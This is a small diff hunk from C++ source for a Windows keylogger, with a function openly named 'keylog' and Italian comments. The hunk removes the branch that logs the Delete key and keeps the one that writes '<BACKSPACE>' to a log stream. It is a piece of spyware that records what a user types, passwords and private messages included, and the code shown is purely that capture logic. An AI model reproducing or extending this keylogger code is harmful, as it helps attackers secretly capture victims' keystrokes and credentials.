@@ -327,9 +327,6 @@ void keylog(void) //Key logger
                     case VK_BACK:
                         write << "<BACKSPACE>";
                         break;
-                    case VK_DELETE:
-                        write << "<Del>";
-                        break;
 
                     //https://docs.microsoft.com/it-it/windows/win32/inputdev/virtual-key-codes
                     //invece di usare ASCII
